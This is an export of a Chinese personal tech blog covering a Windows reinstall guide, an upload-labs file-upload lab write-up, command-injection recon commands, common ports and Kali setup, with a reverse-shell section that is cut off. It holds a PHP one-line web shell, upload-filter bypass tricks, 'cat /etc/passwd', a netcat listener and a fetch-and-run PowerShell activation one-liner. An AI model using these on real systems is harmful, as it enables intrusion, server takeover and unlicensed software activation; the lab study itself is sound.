    <content type="html"><![CDATA[<h1 id="重装系统"><a href="#重装系统" class="headerlink" title="重装系统"></a>重装系统</h1><h2 id="微pe辅助安装"><a href="#微pe辅助安装" class="headerlink" title="微pe辅助安装"></a>微pe辅助安装</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">wepe.<span class="hljs-keyword">com</span>.<span class="hljs-keyword">cn</span><br></code></pre></td></tr></table></figure><p>下载工具箱,打开.exe,选择安装到u盘&#x2F;移动硬盘</p><p>(这一步会对u盘格式化,注意备份u盘信息)</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230713112812.png"></p><p>勾选DOS工具箱,个性化盘符可选</p><h2 id="win11镜像"><a href="#win11镜像" class="headerlink" title="win11镜像"></a>win11镜像</h2><h3 id="msdn-i-tell-you"><a href="#msdn-i-tell-you" class="headerlink" title="msdn i tell you"></a>msdn i tell you</h3><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/msdn.itellyou.cn/</span>              /<span class="hljs-regexp">/这里只有win10及以下</span><br><span class="hljs-regexp">https:/</span><span class="hljs-regexp">/next.itellyou.cn/</span>Original/Index<span class="hljs-comment">#cbp=Product?ID=42e87ac8-9cd6-eb11-bdf8-e0d4e850c9c6            //win11</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230713113324.png"></p><p>选择第一个,复制BT下载链接</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">magnet:</span>?xt=urn:btih:<span class="hljs-number">3</span>a87bac211fd5cd49b81c33eca69919c4a5a74fd&amp;dn=<span class="hljs-built_in">zh</span>-cn_windows_11_business_editions_version_22h2_updated_june_2023_x64_dvd_8e846a1e.iso&amp;<span class="hljs-built_in">xl</span>=<span class="hljs-number">5844441088</span><br></code></pre></td></tr></table></figure><h3 id="BT下载"><a href="#BT下载" class="headerlink" title="BT下载"></a>BT下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs qBittorrent```可用于BT下载"><br></code></pre></td></tr></table></figure><p><a href="https://www.qbittorrent.org/">https://www.qbittorrent.org/</a>            &#x2F;&#x2F;官网地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713113600</span>.png)<br><br>选择download<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713113624</span>.png)<br><br>第一个<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713113639</span>.png)<br><br>还是第一个,直接下载即可<br><br>打开后选择工具--&gt;设置<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713113957</span>.png)<br><br>在BitTorrent的最后一栏,选中并粘贴所有trackers的地址<br><br><span class="hljs-comment">### trackers地址</span><br><br></code></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all.txt">https://raw.githubusercontent.com/ngosang/trackerslist/master/trackers_all.txt</a>            &#x2F;&#x2F;动态更新</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br>全选,复制<br><br><span class="hljs-comment">### 下载镜像</span><br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230720202322</span>.png)<br><br>将前面的bt链接复制,下载iso镜像并复制到u盘即可<br><br><span class="hljs-comment">### hash校验</span><br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713114243</span>.png)<br><br>复制SHA1值<br><br>下载hash校验工具<br><br>```https:<span class="hljs-regexp">//</span>share.weiyun.com/m4VMLcNb```<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230720202407</span>.png)<br><br>选择下载的镜像和前面的SHA1值进行校验<br><br><span class="hljs-comment">## 重装系统</span><br><br>怕搞砸所以用的虚拟机重装<br><br><span class="hljs-comment">### 虚拟机配置</span><br><br>以管理员身份运行!!!<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713155752</span>.png)<br><br>在这一步选择稍后安装,其余默认<br><br>基础步骤完成后不要开机,打开设置,点击添加,选择添加硬盘,选择scsi,选择使用物理磁盘(physical drive选择最后一个),使用整个磁盘,点击完成![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713160142</span>.png)<br><br>在启动处点击小三角,选择<span class="hljs-string">&quot;打开电源时进入固件&quot;</span><br><br><span class="hljs-comment">### 装载系统</span><br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713160714</span>.png)<br><br>选择scsi进入,一直回车<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230720202449</span>.png)<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713161413</span>.png)<br><br>修改为guid<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713161012</span>.png)<br><br>先删除分区再保存<br><br>选择快速分区,分区数目自定义,对齐分区到此扇区的整数倍必选<br><br><br><br>打开此电脑,右键点开镜像,选择装载,双击.exe<br><br>自定义<br><br>![](https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>taosu0216<span class="hljs-regexp">/picgo/</span><span class="hljs-number">20230713161316</span>.png)<br><br>选择系统盘<br><br><span class="hljs-comment">## 激活win系统</span><br><br></code></pre></td></tr></table></figure><p>irm <a href="https://massgrave.dev/get">https://massgrave.dev/get</a> | iex</p><pre><code class="hljs">以管理员身份运行powershell,下载激活程序![](https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230713180143.png)选择1(永久激活)(这一步虚拟机要开梯子挂全局才可以,不知道原因)![](https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230720202550.png)激活成功,按任意键退出### 虚拟机安win11的各种问题#### 安装vmtools#### 升级win11升级到最新版需要tmp2.0(不知道干啥的)确保启动方式是uefi,并打开安全模式在设置--&gt;选项--&gt;访问控制, 进行加密,然后再硬件选项添加一个&quot;可信平台模块&quot;拔出u盘,删掉前面添加的物理磁盘,要不然重启虚拟机会一直报错</code></pre>]]></content>
    
    
    <categories>
      
      <category>CS基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/08/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/08/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>靶场:upload-labs</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Tj1ngwe1/u</span>pload-labs.git<br></code></pre></td></tr></table></figure><p>在upload-labs目录下创建新目录upload</p><h2 id="一"><a href="#一" class="headerlink" title="一"></a>一</h2><p>上传1.jpg,bp抓包,把1.jpg改成1.php,在content-type下另起一行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[x]);<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//@ 加在函数前是取消报错强制执行,eval()是将括号内的字符串解析并执行,$_POST[x]是post传参赋值给x</span><br></code></pre></td></tr></table></figure><p>content-type改为<code>imag/png</code>,原来的<code>application/octet-stream</code>是内容类型未知的意思</p><h2 id="二"><a href="#二" class="headerlink" title="二."></a>二.</h2><p>.php可能被直接加黑名单,出现就禁止,选择更改为别名:   php3  phtml等等</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230711204953.png"></p><p>从这个图可以看出来,大小写也是绕过的一种方法(Php)</p><h2 id="三"><a href="#三" class="headerlink" title="三."></a>三.</h2><p>上传.htaccess文件,让.jpg   .png 等文件以php的方式运行(图片马运行原理)</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-title">.htaccess文件时apache的一种配置文件,可以写入一些规则(phpstudy新版的一键运行webserver打开的是nginx不是apache,就因为这个白忙活很久,nginx的静态页面是默认不允许post方式发送请求的,发post会显示405 not allow)</span><br><span class="hljs-title">.htaccess文件前面不需要加名字</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;pass&quot;</span>&gt;</span>      //<span class="hljs-attribute">pass</span>是上传的文件名,例如pass.jpg<br>        <span class="hljs-attribute">SetHandler</span> application/x-httpd-php  <br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure><h3 id="htaccess配置"><a href="#htaccess配置" class="headerlink" title=".htaccess配置"></a>.htaccess配置</h3><p>打开apache的httpd.conf文件,ctrl f 搜搜AllowOverride ,把null全改为All,允许.htaccess全局覆盖</p><h3 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h3><p>直接在1.jpg文件内,以笔记本方式打开,写入一句话木马(有可能报错)</p><p>在cmd(不是powershell),</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">copy 1.jpg/b+1.php/a pass.jpg<br></code></pre></td></tr></table></figure><p>生成图片马pass.jpg</p><h3 id="user-ini配置"><a href="#user-ini配置" class="headerlink" title=".user.ini配置"></a>.user.ini配置</h3><p>.htaccess文件只能用于绕过apache,而且要求apache版本很低,而.user.ini则可以绕过绝大部分中间件(要求php的server api是FASTCGI,其这个跟.htaccess相反,这个要求php版本尽量高些)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br>auto_prepend_file=pass.jpg<br><span class="hljs-comment">//auto_append_file=pass.jpg  也行,pre是先执行图片马,ap是后执行</span><br></code></pre></td></tr></table></figure><p>php.ini是php的总配置文件,而.user.ini是用户自己定义的.ini文件,具有一定的权限,这条代码是让pass.jpg被插入同目录下的任意一个(默认是index.php) .php文件解析并执行,所以想用.user.ini绕过就必须确定同目录下已经有.php文件,否则就没有了</p><h2 id="四"><a href="#四" class="headerlink" title="四."></a>四.</h2><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mel">php的_FILLES类似$_POST  $_GET   $_COKKIE(获取返回cookie),都是php预制的超全局变量(以_开头,字母大写),是用来获取上传的文件的信息,预制了很多键名<br>name：上传文件的原始名称。<br>type：上传文件的 MIME 类型。<br>tmp_name：上传文件在服务器上的临时存储路径。<br><span class="hljs-keyword">error</span>：如果上传过程中出现错误，该值会指明错误代码。<br><span class="hljs-keyword">size</span>：上传文件的大小（以字节为单位）。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);                <span class="hljs-comment">/*上传的文件保存在$_FILES数组内,然后</span><br><span class="hljs-comment">$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);    $_FILES[&#x27;upload_file&#x27;]相当于提取上传的文件[&#x27;name&#x27;]是键名$_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]的内容就是键name的键值</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>上传的文件名后缀不允许是.php   但如果.php后面加个空格   就允许上传,但是服务器解析时会自动删除空格,达到绕过的效果</p><h3 id="常见限制函数"><a href="#常见限制函数" class="headerlink" title="常见限制函数"></a>常见限制函数</h3><h4 id="trim"><a href="#trim" class="headerlink" title="trim()"></a>trim()</h4><p>删除字符串两端所有空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-string">&quot;  abc &quot;</span>);                   <span class="hljs-comment">//结果是&quot;abc&quot;</span><br></code></pre></td></tr></table></figure><h4 id="strrchr"><a href="#strrchr" class="headerlink" title="strrchr()"></a>strrchr()</h4><p>string right most character   最右边开始的某个字符,一般用于提取文件后缀名,会输出索引及其后面的值,比如”.”是索引,输出就是.及之后的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-string">&quot;1.png&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>);             <span class="hljs-comment">//结果是.png</span><br></code></pre></td></tr></table></figure><h4 id="strtpos"><a href="#strtpos" class="headerlink" title="strtpos()"></a>strtpos()</h4><p>string right most position  会输出索引的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-string">&quot;abc&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>);               <span class="hljs-comment">//输出值为2,   0,1,2,从0开始</span><br></code></pre></td></tr></table></figure><h4 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h4><p>替换函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$string</span> = <span class="hljs-string">&quot;Hello, world!&quot;</span>;<br><span class="hljs-variable">$oldValue</span> = <span class="hljs-string">&quot;world&quot;</span>;<br><span class="hljs-variable">$newValue</span> = <span class="hljs-string">&quot;everyone&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$oldValue</span>, <span class="hljs-variable">$newValue</span>, <span class="hljs-variable">$string</span>);<br></code></pre></td></tr></table></figure><p>第一个位置是原有的(要被替换的),第二个是进行替换的,第三个是原来的字符串</p><h2 id="五-空格绕过-和点绕过"><a href="#五-空格绕过-和点绕过" class="headerlink" title="五.空格绕过( )和点绕过(.)"></a>五.空格绕过( )和点绕过(.)</h2><p>原理:.php会被ban掉,但是.php 和.php.不会被ban掉,但是系统执行.php 和.php.时会自动去掉.和 继续执行文件,所以可以加以绕过</p><p>比如判断是先删空格再删点,那就可以”.php.  .”删掉点后的”  “和”.”会被自动忽视掉</p><p>upload的6.7.8.9都是这个思路</p><p>第八关这个思路也可以,但是之前的源代码相比于之前少了一行关于”::$DATA”的限制,所以这关用”::$DATA”也可以进行绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;1.php::<span class="hljs-variable">$DATA</span>&quot;</span><br></code></pre></td></tr></table></figure><h2 id="六-双写绕过"><a href="#六-双写绕过" class="headerlink" title="六.双写绕过"></a>六.双写绕过</h2><p>有些规则可能是读取文件名,若存在php就直接删掉php而不是禁止上传,所以可以双写绕过</p><p>原理:pphphp,在删掉”php”后正好让其它的字符组成”php”</p><h2 id="七-文件路径修改"><a href="#七-文件路径修改" class="headerlink" title="七.文件路径修改"></a>七.文件路径修改</h2><p>第11关不再是黑名单,而是白名单,类似第一关,但是注意到抓包时第一行多了一个文件的上传路径,所以可以更改文件上传路径的后缀来修改,在添加1.php后紧接着加上<code>%00</code>,ascii值意思是null,有截断函数执行的效果</p><p>第12关也类似,但是把请求改为post请求,get会自动解码,post不会</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">convert selection --&gt; URL --&gt; URLdecode<br></code></pre></td></tr></table></figure><p>改为get请求没有用</p><h3 id="这里的很多坑"><a href="#这里的很多坑" class="headerlink" title="这里的很多坑"></a>这里的很多坑</h3><h4 id="新版小皮面板"><a href="#新版小皮面板" class="headerlink" title="新版小皮面板"></a>新版小皮面板</h4><p>这个漏洞只要php版本&lt;5.3才可以,但是新版小皮面板一下载php5.2.17就会显示网络不稳定不让下载,遂改为旧版</p><h4 id="旧版"><a href="#旧版" class="headerlink" title="旧版"></a>旧版</h4><p>旧版小皮面板确实也有5.2.17,但是一直找不到更改php版本的选项,不过有php5.2.17版本的文件夹,所以直接ctrl cv到新版小皮的目录下</p><h4 id="新版"><a href="#新版" class="headerlink" title="新版"></a>新版</h4><p>在cv完文件后,在网站–&gt;管理–&gt;php版本初可以更改php版本,但是修改到5.2.17后,显示80端口被占用,并且在点击尝试关闭80端口后,把bp给关了,不过bp开了之后就可以正常用了</p><p>还有就是要选择magic_quotes_gpc()这个函数关闭,在php扩展里没找到,打开5.2.17目录下的php.ini,ctrl f搜索magic,发现是On,改成Off,收工</p><h2 id="八-伪协议"><a href="#八-伪协议" class="headerlink" title="八.伪协议"></a>八.伪协议</h2><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>常用指令</title>
    <link href="/2023/08/20/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/08/20/%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="实用命令注入"><a href="#实用命令注入" class="headerlink" title="实用命令注入"></a>实用命令注入</h1><h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><p>打印当前文件路径</p><h2 id="whoami"><a href="#whoami" class="headerlink" title="whoami"></a>whoami</h2><p>打印当前用户名称</p><h2 id="ps-ef"><a href="#ps-ef" class="headerlink" title="ps -ef"></a>ps -ef</h2><p>展示当前系统进程</p><h2 id="cat-etc-passwd"><a href="#cat-etc-passwd" class="headerlink" title="cat &#x2F;etc&#x2F;passwd"></a>cat &#x2F;etc&#x2F;passwd</h2><p>查看用户列表及基本信息</p><h2 id="locate-name"><a href="#locate-name" class="headerlink" title="locate name"></a>locate name</h2><p>name是要查找的文件名称,比如要查找123.txt,可以使用locate 1  来定位文件名字中包含1的文件的路径</p><h2 id="lsb-release-a"><a href="#lsb-release-a" class="headerlink" title="lsb_release -a"></a>lsb_release -a</h2><p>linux standard base_release -all          当前机器的linux发行版本的所有信息</p><h2 id="nmap-sn-192-168-1-1-24"><a href="#nmap-sn-192-168-1-1-24" class="headerlink" title="nmap -sn 192.168.1.1&#x2F;24"></a>nmap -sn 192.168.1.1&#x2F;24</h2><p>存活端口快速扫描</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>常见端口</title>
    <link href="/2023/08/20/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/"/>
    <url>/2023/08/20/%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>-21  FTP文件传输协议</p><p>-22 SSH远程登陆</p><p>-23 Telent远程登陆端口</p><p>-80 HTTP传输协议</p><p>-443 HTTPS </p><h2 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h2><p>-53 DNS域名解析服务</p><h2 id="常见其他端口"><a href="#常见其他端口" class="headerlink" title="常见其他端口"></a>常见其他端口</h2><p>-8080 http代理端口</p><p>-8888 公共ssh端口</p>]]></content>
    
    
    <categories>
      
      <category>CS基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kali</title>
    <link href="/2023/08/20/kali/"/>
    <url>/2023/08/20/kali/</url>
    
    <content type="html"><![CDATA[<h1 id="kali学习"><a href="#kali学习" class="headerlink" title="kali学习"></a>kali学习</h1><h2 id="语言"><a href="#语言" class="headerlink" title="语言"></a>语言</h2><p>终端输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dpkg-reconfigure locales      <span class="hljs-meta">#dpkg -- debian package</span><br></code></pre></td></tr></table></figure><p>空格选择cn，一路yes</p><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><p><code>apt-get install ibus ibus-pinyin</code><br>重启</p><h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo passwd root</span><br></code></pre></td></tr></table></figure><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>终端输入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo su    <span class="hljs-comment">#进入root模式</span><br>vim <span class="hljs-regexp">/etc/</span>apt/sources.list    <span class="hljs-comment">#进入vim编辑器，输入i开始编辑，esc退出编辑,:wq保存</span><br></code></pre></td></tr></table></figure><p>将原来的deb注释掉，加上新的源</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#中科大</span><br>deb http:<span class="hljs-comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br>deb-src http:<span class="hljs-comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></code></pre></td></tr></table></figure><p>更新软件列表(非<a href="https://so.csdn.net/so/search?q=root%E6%9D%83%E9%99%90&spm=1001.2101.3001.7020">root权限</a>在命令行前加“sudo”)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update 更新索引<br>apt-<span class="hljs-built_in">get</span><span class="hljs-built_in"> upgrade </span>更新软件<br>apt-<span class="hljs-built_in">get</span> dist-upgrade 升级<br>apt-<span class="hljs-built_in">get</span> clean 删除缓存包<br>apt-<span class="hljs-built_in">get</span> autoclean 删除未安装的deb包<br></code></pre></td></tr></table></figure><h2 id="下载软件"><a href="#下载软件" class="headerlink" title="下载软件"></a>下载软件</h2><p>下载chrome<br>在官方下载64位deb文件后，依次</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo su       <span class="hljs-comment">#进入管理员模式</span><br>apt <span class="hljs-keyword">install</span> -f<br>dpkg -i filename.deb<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /opt/google/chrome/google-chrome<br>注释掉<span class="hljs-built_in">exec</span> -a “0 <span class="hljs-string">&quot; &quot;</span> 0<span class="hljs-string">&quot; &quot;</span>0<span class="hljs-string">&quot;&quot;</span>HERE/chrome” “<span class="hljs-variable">$@</span>”<br>新加<span class="hljs-built_in">exec</span> -a <span class="hljs-string">&quot;<span class="hljs-variable">$0</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$HERE</span>/chrome&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$@</span>&quot;</span> --user-data-dir --no-sandbox<br></code></pre></td></tr></table></figure><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607181522.png"></p><h3 id="shell与终端"><a href="#shell与终端" class="headerlink" title="shell与终端"></a>shell与终端</h3><p>终端相当于一个前端页面,在终端输入指令,然后系统传输到shell,而直接执行shell就相当于在后端直接执行命令</p><p><img src="C:/Users/10913/AppData/Roaming/Typora/typora-user-images/image-20230607180611246.png" alt="image-20230607180611246"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607180638.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230607180651.png"></p><p>shell的位置是&#x2F;usr&#x2F;bin&#x2F;sh</p><h3 id="反弹shell的步骤"><a href="#反弹shell的步骤" class="headerlink" title="反弹shell的步骤"></a>反弹shell的步骤</h3><h4 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h4><p>使用netcat(network concatenate)网络连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 4444(不一定非得是4444)<br><br>-l listen 监听端口,就是开放一个端口的意思<br><br>-v --verbose 输出详细信息<br><br>-p 